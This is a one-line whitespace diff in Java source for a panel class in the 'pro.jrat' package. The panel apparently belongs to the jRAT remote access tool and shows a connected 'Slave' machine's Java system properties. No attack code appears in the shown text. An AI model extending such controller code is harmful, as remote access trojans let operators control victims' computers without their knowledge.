@@ -18,7 +18,6 @@ import javax.swing.table.DefaultTableModel;
 import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet61SystemJavaProperties;
 
-
 @SuppressWarnings("serial")
 public class PanelControlJVMProperties extends PanelControlParent {
 
